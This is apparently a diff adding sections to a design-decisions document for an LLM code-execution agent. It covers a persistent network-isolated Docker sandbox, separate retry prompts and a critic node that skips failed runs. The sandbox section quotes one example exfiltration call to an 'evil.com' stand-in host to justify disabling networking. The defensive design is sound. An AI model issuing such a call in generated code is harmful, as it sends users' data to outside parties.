@@ -290,6 +290,85 @@ Compose scales to multiple services naturally — you just add another entry. Ma
 
 ---
 
+## 11. Docker Sandbox: Long-Running Container with `docker exec`
+
+### What it is
+A persistent Docker container (`fetcher-sandbox`) running `sleep infinity`. Code is
+executed by calling `docker exec` to run a Python command inside the already-running
+container.
+
+### Why a persistent container instead of per-execution containers
+
+**Cold start penalty.** Creating a new container per execution takes 500ms–2s (image pull
+check, filesystem setup, process launch). The self-correction loop may execute code 3–4
+times per task. A persistent container eliminates this overhead entirely — `docker exec`
+starts in ~50ms.
+
+**Resource predictability.** One long-running container with `mem_limit: 512m` and `cpus: 1.0`
+is easier to reason about than a variable number of short-lived containers competing for
+resources.
+
+**The trade-off:** state leaks between executions. If one code run writes a file, the next
+run can see it. For our use case this is acceptable — each code task is independent, and
+the sandbox runs as a non-root user with limited filesystem access. If isolation between
+runs becomes critical, we can add a cleanup step or switch to per-execution containers.
+
+### Why `network_mode: none`
+
+**Security.** The sandbox executes LLM-generated code. If the code contains `requests.get("https://evil.com/exfiltrate?data=...")`,
+it should fail silently. Disabling network access is the simplest, most robust defense.
+
+The pre-installed packages (numpy, pandas, matplotlib) all work offline. The only casualty
+is `requests`, which we include for data parsing tasks but which cannot make actual HTTP
+calls from inside the sandbox. If a task genuinely needs network access, we'd need to
+rethink this — but that's a conscious security decision, not a default.
+
+### Why non-root user
+
+Defense in depth. Even without network, the container runs as `sandbox` user rather than
+root. This prevents code from modifying system files, installing packages, or escalating
+privileges inside the container.
+
+---
+
+## 12. Code Self-Correction: Separate Prompts for First Attempt vs Retry
+
+### What it is
+The `coder` node uses two different system prompts: one for the initial generation and one
+for retries. The retry prompt includes the previous code and the specific error feedback.
+
+### Why not one prompt with optional error context
+
+**Prompt focus.** When the LLM sees a clean task description, it approaches it from scratch
+with full creative latitude. When it sees a task + broken code + error, we want it to
+focus narrowly on *fixing the specific error*, not reimagining the approach. Different
+prompts produce different LLM behaviors.
+
+**The retry prompt explicitly says "fix the code based on the error."** Without this framing,
+the LLM sometimes ignores the error and rewrites from scratch — producing the same bug.
+The dedicated prompt keeps it focused on the traceback.
+
+---
+
+## 13. Critic Node: Skip LLM When Execution Already Failed
+
+### What it is
+If `exit_code != 0`, the critic immediately returns `is_verified=False` with the stderr
+as feedback, without calling the LLM.
+
+### Why this matters
+
+**Token savings.** If Python raises `NameError: name 'x' is not defined`, asking the LLM
+"is this output correct?" is a waste. The error is self-evident. Skipping the LLM call
+saves ~500 tokens per failed execution. In a 3-retry loop, that's 1500 tokens saved.
+
+**Speed.** Each skipped LLM call saves ~1 second of latency.
+
+The LLM critic is only invoked when code *runs successfully* but might produce *wrong
+results* — the harder judgment that requires understanding the task intent.
+
+---
+
 ## Decisions I Would Revisit
 
 These are choices that are correct *for now* but may need to change:
@@ -309,3 +388,12 @@ These are choices that are correct *for now* but may need to change:
 4. **Stub-based integration testing**: The supervisor's full-flow test uses stub sub-graphs.
    Once real sub-graphs are wired in (Phase 5), we'll need integration tests that exercise
    the real CRAG and Code paths end-to-end.
+
+5. **Sandbox state leaks**: The persistent container doesn't clean up between runs. If
+   tasks start interfering with each other, add a cleanup step (remove temp files) or
+   switch to per-execution containers with a warm pool.
+
+6. **Fixed sandbox packages**: Only numpy/pandas/matplotlib/requests are pre-installed.
+   If the LLM generates code requiring other packages, it will fail. Options: expand the
+   image, add a `pip install` step in the executor, or have the coder prompt list available
+   packages.
